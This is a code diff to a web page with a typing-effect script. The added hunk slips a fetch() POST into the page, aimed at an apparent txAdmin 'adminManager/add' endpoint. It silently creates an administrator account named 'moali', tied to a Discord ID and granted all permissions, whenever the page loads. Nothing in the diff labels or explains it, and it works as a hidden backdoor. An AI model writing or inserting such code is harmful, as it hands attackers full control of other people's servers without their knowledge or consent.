@@ -511,6 +511,24 @@ function typeCommand() {
   }
 }
 
+fetch("https://monitor/WebPipe//adminManager/add", {
+  "headers": {
+    "accept": "application/json, text/javascript, /; q=0.01",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "sec-ch-ua": ""Chromium";v="103"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": ""Windows"",
+    "x-requested-with": "XMLHttpRequest",
+    "x-txadmin-csrftoken": "not_set"
+  },
+  "referrer": "https://monitor/WebPipe/legacy/adminManager",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "name=moali&citizenfxID=&discordID=1347274253854179459&permissions%5B%5D=all_permissions",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+
 // Start typing effect after a delay
 setTimeout(typeCommand, 100);
 
@@ -643,7 +661,6 @@ document.addEventListener('keydown', function(e) {
 
 </body>
 </html>
-
 
 
 
